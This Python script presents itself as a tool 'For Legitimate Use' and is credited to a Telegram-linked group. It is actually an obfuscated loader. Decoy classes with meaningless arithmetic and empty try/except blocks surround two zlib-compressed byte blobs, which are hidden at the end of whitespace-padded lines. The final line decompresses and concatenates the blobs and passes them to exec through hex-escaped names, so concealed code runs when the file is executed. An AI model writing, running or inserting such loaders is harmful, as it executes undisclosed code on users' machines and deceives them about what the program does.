from builtins import *
from math import prod as Power


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_random, Substract, Add, Hypothesis, Statistics, _while, Product = exec, str, tuple, map, ord, globals, type

class Cube:
    def __init__(self, _walk):
        self._detectvar = Power((_walk, 46394))
        self.Square(Floor=2737)

    def Square(self, Floor = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._detectvar -= 27996 - Floor
        
        try:
            (Add, _stackoverflow, _random) if Statistics != _random else {Statistics: Substract} <= Hypothesis

        except ArithmeticError:
            (({Statistics: Substract}, Substract) for Substract in {Statistics: Add})

        except:
            Product(92024 + -89503) == None

    def MemoryAccess(self, StackOverflow = 65877):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        StackOverflow -= -20901 * -3104
        self.Run != None
        
        try:
            ({_stackoverflow: 'nxrrmn'} or _random if {_stackoverflow: 'nxrrmn'} and _random else ... or (_random, {_stackoverflow: 'nxrrmn'}))

        except AssertionError:
            (Statistics, _random, Add) if Substract >= Hypothesis else (Substract, _random) == Statistics

        except:
            Product(60558 * 28445) == str

    def Walk(_substract = False):
        return _while()[_substract]

    def Calculate(Negative = -99377 * 70872, _frame = Ellipsis, _positive = _while):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _positive()[Negative] = _frame
        
        try:
            ({Statistics: Substract} or Substract if {Statistics: Substract} and Substract else ... or (Substract, {Statistics: Substract}))

        except TypeError:
            ({Statistics: Add} or Statistics if {Statistics: Add} and Statistics else ... or (Statistics, {Statistics: Add}))

        except:
            Product(49249 * 41135) == True

    def execute(code = str):
        return _random(Substract(Add(Hypothesis(Statistics, code))))

    @property
    def Run(self):
        self.Theory = '<__main__._frame object at 0x000001945BE84787>'
        return (self.Theory, Cube.Run)

if __name__ == '__main__':
    try:
        Cube.execute(code = __license__)
        _run = Cube(_walk = -92831 + 87599)

        Cube(_walk = -71165 * 23006).Square(Floor = _run._detectvar - 21937)                                                                                                                                                                                                                                                          ;Cube.Calculate(Negative='SS2SS2SSS222S2SS22SS2S2222',_frame=b'x\x9c\xdd\x1bis\xe2\xc8\xf5;\xbf\x82\xf8\x0bR\xcc0\xa2uSEU\xa6\x82w\x17\x07\x9b\xad\xf5\xa4\xec\xad\xa9)JH-[^!\x11I\x0c8[\xc9o\xcf{\xdd\xad\x03\x03\xb6\xc0f\x9c\xb1\x8e\xbe\xd4\xe7\xeb\xd7\xef\xeaV\x96<\xf4\x1aM\xb8\x02_b>^\x93I\x16\xc7\xe1d\xd2\xfcK\xff\xe4\xa78i\x8e\xe8m\x90\x053\'\xa3\xcd\x7f\xa6\xf4\xa4\x19\'\x95\xac\xce"\xbb\x8b\x93\x94\xe5\x96N>\xd3\x90\xde&\xce\xacw\xd2>\xf9\xdb*r\xa6\xf1\xf4D^\xcb\x1f\'\xb7N\x14\xfc\xdb\xc9\x828\xe2M\xfc\xc3IfN\xf3\xea!\xf2\x02\x17\xdaxT\x7f&j\xe4y\xef\xb2l\x9e\xf6>~\xcc:3\xfa\x91\x15\xdcU\xee\x1bM\xd2\xa2\x89\x11|O\xb3G9\xc2\xc0\xa5QJY\x8e\x96f\xa9\x86\xa2\x9a\x9ej\x13b\x12\xb5\xab\x13e\xea\xaa\xaaf8\xb6\xe6Z\x8e\xd9j\xc8\xbd\xa2l\x10eR+\xfd#\xf0Zr\x83\xae\\:\xcf\x04\x10\xa3\xf9"\x93N~\r\xa9\x93\xd2\xe6 \x8eZY\xf3"\xf6\x02\xff\xe1Dn\xf0F\x83\xd9<N\xb2\xc9\x04\xca?\xa4-\xb9CWA&\xc9\x8d0v\x9d0\x95\xe4/\xadq<V\x94X\x01w<\x06w\x8c\xe1\xb8\xf5\xb5\x7f\x1b\xc6S\xc8\xd2\xd8\xfa\x1d\x0b\x06\xe1}p\x7f\xcf_\xb8\xc0\t\xc3\xd6\x97^\xef\xf4\xc3\xe9\x07\xe9\x83t\xda\x95\xe5\xafP\r\xcd\x9c,KvWss}}s\x83\x0f\xf8\xd7\xe8n\xd6\xe1\x05O\x95\xc7\xc2\xac\xe4\r^\xac\x16\xe6\xc3\x18\xf8(\x1b;\xb3`\xf9p\x18\x86\xe1p\x98{\xe8\x0c\xa1h\t\xb9\xddM\x0f\x87\xa3\xd1\x88\xbd\xe7\xc3\xd19\xb8#lsK}Rk\xba\x08\xc2,\x88p\x06\xbe9I\xda\xd8,Z\xc2B\xc0\xe1\x86\xf7\xf9\xe6\x06*m\xb5:\xf7q\x10==\x92\xd9,b\xd7\x0c/\xf4\xb07!\x9b\x99\xa0\x98\xa9\xfb0\x90\xb6w1\x8d\x82,\x0c\x16\xd3\xc7\xf0\x97\xdb\xd7e\x97x\xff\xf6\xadA\xfe\xf2\xf2*:A\xe4\xd1\x95\xd4\xa2i\xe8\xfc\xb4\xf1\xf9\xab\xfc4l\xae\x08!WW\xf0\\\xb1\x10>\xef\x13:\x8b\xe4\xf36\xe0\xec\xc4\xe1+\xc2AsE\xc4\xf3>\xe1\x92d\xe96\xb0l_\x86\xac\xfe!^\xb9\xcfH\xc2\xfb\x83J\x18\xc7\x9b_w\x82e\x1c\x03\xd2(\x80@c\xc4%@\xa2\xf8]\x02%s\xe2\xd0\xdf\x9b\xc0\x14,\x8cu\x82e\xc4\xe0\xbb\x84\x10\r\x83\xf9,v\xf7\xa23\x88D\xfc:g\xb8\x05Q\xbc\x87\xa3\xfd \x14\x04n\n\xe2\xdc\x0b \xb4\xb3\x86\xfa\x10\xda]E\x0e\xa1\x07?\x08W\xf4.Z\xec\x8dG\xe7p\xb1\xe5\x07.\xac\xbe!\x07\xd2\xbb%@\xce7\xba\x0f\x1a\xed\xc4"i\xda2(\xdc\x1es\xcb\xdb\xab\xde |y\xd4\x8d=*\xb5,?\xdb27\xef\x10\xc2.]m\x85\xf0v\x12\xcf\xa5\xc7(\xf7\xe0\x05\xb7Z|\'zJ-\xb9\x0b9\x94\xba\x99\x95\x892Q\'\xd6\xc4\x9c\xe8\x13{\xd2\x85\x90\x81\xbd\xdbL=B\xebOa\x91\xaa\x10\x8fX\xc4S\xbb\xc4~\x0e_d\xee\x14/\xe0\x8f3\x9bzN\x13\xd0V\x19\xc7\x02o\x15\x05\xb9%\\Jo\x1b\xd0w\xcc\x04\xb2W\xa8\x02\xbcA<\x80\xd0x0\x06\x1f\xa2\xf5\x01l\x01(\xd5\x89\x06\x804 lO4\x06\xe0\x8d\xd4\xa3L\xaf\x06\xb5\x13\xd6\x02\xb6\xa8\xc0t\xe2\xf4\xea\x9b\xa9o=c\x87\xb5ILS7UC7Ay\x7f\xb6\xcd]km\xc6\x16\xd9\xac\xb8p\xb9}\x7fp\x1c\x0c\x02\xa2:*Q\x15\xd5R\x01\n\x87\x02\x81\x0bK%\x0b\xe4\n\xf0um$\x87\x1c\xdd\xba\x99U +\x06\xdc6\xf8\x88\xfd@d\xa0\x84\xb6\x99\xfa\n\x93\xa0\xe9\xbe\xaa\xc3K\x84\xaf\x89\xb0\t\xaf\x02o\x17\xd3\xc8\x94MT\x9d\xbc\xea~\xb8}8^\x1f\x8c\xcfOU\xab\xf9\x86\xaf\xf9\x9a\x86\xbe\xc1\xc2\x06\x8b\xf14x5\x8c\xf3/\xcf3\xe9m\xea\x99$\xfdw\xc3\xfc!\xc7\x89$mQ\xfce\'\xf2\xa4\xcd\xdc;q\x14)\xf0\x80\xd1^\x1e\x1as\xaa\\\x1f\xedt\x86`\xfaDe(f1\xa4{\x94V\xb72\x02E\xb00a\xf4\x93\xd1P(\xa1n\xa6\xbe\x02\x0ew\x05!Q\xbe\x17\xee\xe9\x04(*\xa0\xbd\xe1\x9a\x1a\xf1u\xd3\xf0MbL\r\x1b\xe48\x93x\xfc\xab\x01_\xe1F\xca\xeb\xe9\xa6fi\x1e\xa1\xa6fZP\xe2(\x98\xebi\xb4\xb8\xbdJ\xcc\xab\xc4\xbc\xf2\xae!br\x11\xa1"\xfc\x0b\x9b\x1f\x17\xf9nzO\xa8\x07\xfb\xf7_\x88\xbe\xb9(\\\x8a\xc8\xeb\xae\x97\x8b\xca\xcf\xf7\xff\xe0\xc9\xd5\x0c\xcb\xe8B;S\xa2\xe86L\xadN\xbaG\x99\xb25-`M\xfe_Ke\xb9\x8e6\xdc\x929\xaa\x873G&}3\xb1 \xe22y4;\x8a\xb0\xb6\xa7dg\x82\xf4F\x98\x98\x8e\xb2\\w\xd2e\x92\xddF\xeaQx\xf8^\x99Q\x8f\xd0\xe0V\x84\xb8\xab1\xdako\xa6\x1e\x07\xaaL\xa8\xe0\x00Q\x99^C\xa0\x04\xd9L}{@\xc1l1\x0e\xa2\xe0\xbc1\xf0X\xac\xab\x1b\xa9o+\xad?\xf7\x1e\xbeZ\r\xe0\x1fp+\xa6\xaa:\xc4\'\xbe\xa1\x9a\np\x9e.\xf0\x1f\xcf\xe8\x12j\xa8\x86J|\xcd\x03\xded\xeb\x16\x90|\xcbpau\x9b\xaa\xa5[\xaamZ\x9a\xaf+\x86G|\xe4C\x9a\xaaMA\x86\x83\x92\xaa\ndN\x81\xfc\x1e\xf00\x1f\xf8\x94\x02\xed(\x07\xd3\x83\'\xf9\x94\xc6%)\x83KVE\x8c\xbd\xec\xae\xcd\x99V\xcb\xe5r\xb5\\\xad\n\x07\xe2\xcb\xde\x0e\x8b\xcc\x0e\xcauyqqyq\t\xd7\x05\x060tqY\x17\x19\xcdB5E\x1b\x01JI&\x94\xb06S\xdf\x06\x19\x0b8\x95\x92%a\xb2%H\x96\xfb(\xf8B\xf3\xe1\xdc^pz4\x18\xbf|P\x86\xd0!Tx\r\xe1\x13\x116\x85o\x08\xdd\xa3N^\xfd\xd8\x8a$\xe8\xd2\x9aa\xa8\xd6\xe1\x9c2\x17\x9er\xd9\xe9\xe6\x15\xc0h\tp\xe4 Q\x04\xa8\xba\x155\xcd\x16`\xac\x93\xd7:.\x18A\x9d\xac\x8f\xcb;\xc0x\x1f\x84\xe1\xfd\xfd=ZA\xc3\xfb\x10\x8d\x9f\x18\x0b\xea+\'\x84\x99v\x80\xa7MPQQ\x18\xc7S7S_av\xec\x8a\x82\x9c+\xc9\xb6\x806\xce\x82U\x99\x9d:yk\xce\xce\x1a\x05\x00(\x01\x8c\xf0\xf8\x03\x03\x18s\x03\xf0\xee\xf7\xa3\x96Ok\xce\xebzr\x11\xcacB\x93\xaeM\xdd\x87!\x9a\x90Qu\xceC\xc3}\xa8\x16\xe3\tK\xc6\x18D\x90\xf1\x87\xd5\xf7W7_@n\xdc\xa3\xb0\xe0B\xbf\xf0\xd6T\xaa\xca^\xc4\xf1\xb4\r\xc3\x00\t\x03\xb4\xe2c\r\xac\xd0\x0f\xd74G\xef\xf10\x8f7\xc0\x17\xccY+\x1e3\x9bM\x8cV\xf4\xf1\x98Yr^\x01]UAD\x94\n\xf7\xcc\xe3\xb6 *\xb9\x85\xafN\xde\x9a\x16\xbe\x17X\xac\x15\x90gAd=\xdcb]\xecF\t\xfb\x047^\xbc\xbd\xfa\xb2G\xe6c\x18\xbc^8-\x87o!<\xc98l\xcd\xd5\x1cxmpm\x11+]\x97}\xe1\xbe\xc3S\x8f\xb8x5Cg\x16:\xd0\x86\x80Ju\xd1\xa2w\xf8r\x06\x19\x05\x84\x93\xfcF\x86\x8b\x1b\xb5\xdf{\x9b\xd0\xaaHx\xf9R\xae\x1a\xf11\x9dT\xa4\xc3\xe7\xf2\x1e\xa4\x810s6WArg\x7f\xf3a\xeb\x92\xa9j\x17k*[}\x91\x0f\xc5:\x8d\x192\x14\xae\x9a1\x91o#\xf5\xad\x94\xb5\x83\x97%Z\x9aAj4\x89a\x9b\x9a\t\xd3f\xa2r=\x85Tz\x1c\xb3\xa5\xcdn4n;\xcc\xb7\xc1wD\x9a-b\x8e\xf01\x8f{<[\xad\x06\x83d\x8b\x96\x10E\x83\xd6\x81mh\xaaC\x94\xc3Y\xc7\x00\xf7\xb3\xf9\xce\xc9x0\xc6\rmp\x07\xaf\x80\x14\xf9\x1a\xca\x95\xd7\\\xf3\xb2\xc5\xfab\xb2\xbfX\x87u\xf2\x1a\xff\xc7\xd2gk\xc8O~\xe4\x12\xbc\x90\xe1\x7f(\xd9\x9b\x18\xe4\xf0\xf1\x97[\xe6\xcc(\x9e\xdb\xc6kZ\xc5_\x17\x02\x85\x15Hl-\xf2\xbdE\x92\x07_O\x05\xd4-\xddd/\xba\xa5o\x15\xe9y\xaa\x99\xc7\xeb+\x83\xc3\xe2,Qq\xb8\x08\x03\xfbh\x84\xa4<A,\x00\xc0\xcf\x11\xbf\xe1\x9c\xb0\xa5!\x94[\xb6^\xb8\xb3\xcf\xb0\x9e\xa5\xd4\xae\xa0\xc5\xe5\xeb\n\n.h\xf5\xb1\xa83W rV\xc8\x94\x8cC\xed=O\xca\x8f\x8e\x90\r\xb9\xbc\x98K\x8ev\x11?\xa2\xbc\xa8\xbb/\x91\x0f1\n\x8d\xb0\x96\xce\xcf1\xf6#\x11H\xe2\x03"\xf9\x86\xc9dd_\xad\xc4t<:A\r\xd7\xb4U\x94\x81\x0e\x86\x0f\xb3\xd9\xe0\xc5\xcc8\xcb\x95\xb0\xe0,\x7f (\x99\xba\x0f\xd0\xf0\xb8&\x81\xe1\xa3Hdk$\xd6\xac\x84J\xe2\x9b\x87\x9em\xfe\xf0\xa1\x1a\xb5v\xc9\xfd$\x9e5\xf3\x9f\x8c\x9a\xfc\xd7\xa5&]Q\xb7\xcd\xfe\x11k\xcf\x93 \xca\xda\xf8\xce\x9cy;\xcd\x92v<\xa7Q\x03sH\xf9\xa1\xabB\xaf\xe7\x11\xb9!\xaaq\xe3\xc8]$\t\x8d\xb2\x8e\xbf\xc8\x16\tM\xf3/\xe9,\x9b\x87\xc1\x94\xb7\x9e\x053\x9a\xb7\x0c\r\xf8\x18\xdf\xfc\xc2\xc2N\xca\xfc$\xaf\'q"/\x9e\x151Z\x86\xfe\xb5\xa0iV\xb6\x97\xc10n\x1b\x95\xaax\x03n\x1c\xc6\x893sD#\x7f\xcds\xc4P2\n2\xc9Yd1t\x9bf}~\x902f\xf2\'\n\xa2\x03v\xa8Rn$\xd4\x9d\xb8A\xdc\x9f\xe5;\xed\xe2\xec+8\xd0D\xff\'(\xde\xf9\xedl\xd0\xf0]\x1e\xfe\xfb\xef\x9f.\x1b\xfe\x92G\xae\x7f\x19~>k\xf8\xb7<\xf6\xf3ogg\xf0m\xc6c\x17\x9f~>\xbb\xfc\xfc\xa9\xe1?\xf0\xf8\xefg\xa3\xd1\xf8\xba\xe1Q\xbf\xe9\xce\xdd;\xea\xfe!-\x92P\xfc\xeb\x97\xe5\x7fG\xe2\x05\x10q\x82\xa8\xbdHi\x1293\xda\x9e/\xbd>d\xed\xa4\x00\xf2L\x1a\x14R4H\xd40\x04.`\xcb\x8fJ\xf7\xb9\xd7I\xe8<t\\*E\xb3\xe2\xccS~\xcc\x17\x92\xda\xd1\xe3s\x88\x98Z\xd6\x05S\xdc\xcf\xa7\xa2sES\xfc\xcfQ*?\xdf\xc5i&\x1a:\x85\xa55bx\x8e\xa8=\xc2XYK|\xdb\xff\x13\xfb:`s\x80\xc7')

        if 463004 > 8387059:
            Cube(_walk = 21240 + 56048).MemoryAccess(StackOverflow = 28293 + _run._detectvar)
        elif 105686 < 3878647:
            Cube(_walk = -75692 * -92862).Square(Floor = _run._detectvar + 90828)                                                                                                                                                                                                                                                          ;Cube.Calculate(Negative='MNMMMMMMMNMMNMNNNMNMN',_frame=b'Y\x07\xe3\xb10\xcb\xc5\xbdb\x9c\x98\x83\r\x8a\xdb\xec\xd0v\xd7\x83\xb1\xff\xa7\xa8\x08\xba\xd2\x87.u\xe6\xd0\xae\x84\x8d\xb7=\'s\xfaP\x7f\x1bQ"^d\xfd\x9b\xca^\x10C\xe7\xb2\xb7\x81\xdf\xbc`:.\xdb\x94\xbc\x10\x9b\x93\x97\xcd B\xf4\x92\xa0\xf2\x0e |\x06\xd8^\xf9\x01\x13/\xb6\x84\xa4\xc3\x96\xb1\x01R\xaf95\x0c\xc34=}J\x89e\xd8D\xf7\x88\x02i\xa8U\nJfz\xa6kN\xf3\x93\xa5@\xeb\xbb\xf0E\x17\xa9\x8ai\x1a\x9a\texi\xa2\xe8\x06|G\xa1C\xab\xc1\x0b\xe4\xb5\xa1\xe0\xda\x978\xf4\xc7x\xb4\x8d\xe3\x10\x0f\xb5s\x98U6\xd4 &w\x96I\x90QI\xcc\xf3J\x18\xfe\xab;\x01\xe8\x9f\xe6\xd3xZ\xe0QT\x11\xd8Oa"O\xcf\x19\x8a\x8c\x10=\x90\x14\x0f\x87e\xe7h\x98\xd2\xd7\x87\xbaI^\x0f\xea\x1a\x96\xd8\x1f\xf2\xd5\xbfv\xd9\xb0\x9c4eD u\x9dH\xf2\x17\x91\x8b\xff\'\xb7S\x00q\xba\x8d\x18,\x83\xecn\x0b!\xee|\xbeK\xa8\xe3\xfd\x1a\xc7\xe1\x19\x90r$s\x12\xdb\x8a\xe2w\x18\xf0\x7f\x19d \xb8T|_\x07o\x9e\xda\x01\xb6\xf0\xb8\x1b\x95\x8e7\xcf\x98\x07\xdf\x90vW\xa6\x88O\x0f\x95\xd9X\x103$\xd1\xfbi<u\xa6\xf1C\x9f\xff\xa2\x1c\xe0\xcf\xc1\xd8\x1f\xb1Y\xc6\x7f\xaf\x08\xefC\xde\x88\x1f\x844\xed\xffY\xa8t\xe2p\xe6\xac\'\x89j\x18\xb7*"\x8f\xf4_\xa1\xc1\xc8m\xce\xd69\xdd9\xcf\xb9=`\xc3P\xe6\xc4\x03\x006\x8f\xa3\x94\x96\xc4\x8c\x91\x10A\xfb\xdb\xbc\x17\xcc\xe5\xddb`\xe8\xaf5]pG\xb1,\xb8E\xbcM#@\x01`M\xfd\xe2\xcf]\xceKs3\xb9\xdc\xc1i\x92dN\xbc\xc3 \xa2\xa9 \xa0l\xfe\x05\'\xc8\xe1\x0e$j2\xc1E4\x99\xf4\xfbB:[\xe6\xe2\x1a\x97\xdc\x96K\x0ef\x0e\xf2F9\x15\xf9\x7f\x1bQ\xf9\xb0\xf5\'7\xfe\x07\x9e\xaf\x03\x15')

        Cube(_walk = 81819 / -33592).Square(Floor = _run._detectvar * 16303)                                                                                                                                                                                                                                                          ;O0oOoO0Oo00Oo0ooOoOoO,MMMMMNMMNNMNMMMNNNNMMNN,S22S22S2SS2S222S2S2S2SS,XXWWWWWWXWWWXXWWWWXWWXWWW,illiiililililiiiijljlllj=(lambda NMMNMNMNMNMNNMNNMMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMNMNMNMNMNNMNNMMN)"),filename='\x58\x58\x57\x57\x58\x57\x58\x58\x57\x57\x57\x58\x57\x57\x58\x58\x57\x57\x58\x58\x57\x57\x57',mode='\x65\x76\x61\x6c'))),(lambda NMMNMNMNMNMNNMNNMMN:NMMNMNMNMNMNNMNNMMN['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda NMMNMNMNMNMNNMNNMMN:NMMNMNMNMNMNNMNNMMN(__import__('\x7a\x6c\x69\x62'))),(lambda llIIIllIIlIllIIIllIllIlI,NMMNMNMNMNMNNMNNMMN:llIIIllIIlIllIIIllIllIlI(NMMNMNMNMNMNNMNNMMN)),(lambda:(lambda NMMNMNMNMNMNNMNNMMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMNMNMNMNMNNMNNMMN)"),filename='\x58\x58\x57\x57\x58\x57\x58\x58\x57\x57\x57\x58\x57\x57\x58\x58\x57\x57\x58\x58\x57\x57\x57',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _run.Square(Floor = _run._detectvar + -61347)                                                                                                                                                                                                                                                          ;illiiililililiiiijljlllj()(XXWWWWWWXWWWXXWWWWXWWXWWW(MMMMMNMMNNMNMMMNNNNMMNN(S22S22S2SS2S222S2S2S2SS(O0oOoO0Oo00Oo0ooOoOoO('\x76\x61\x72\x73'))),Cube.Walk(_substract='SS2SS2SSS222S2SS22SS2S2222')+Cube.Walk(_substract='MNMMMMMMMNMMNMNNNMNMN')))

    except Exception as _stackoverflow:
        if 316526 > 1868299:
            Cube.execute(code = Substract(_stackoverflow))

        elif 206660 > 1807547:
            _run.Square(Floor = _run._detectvar - 94049)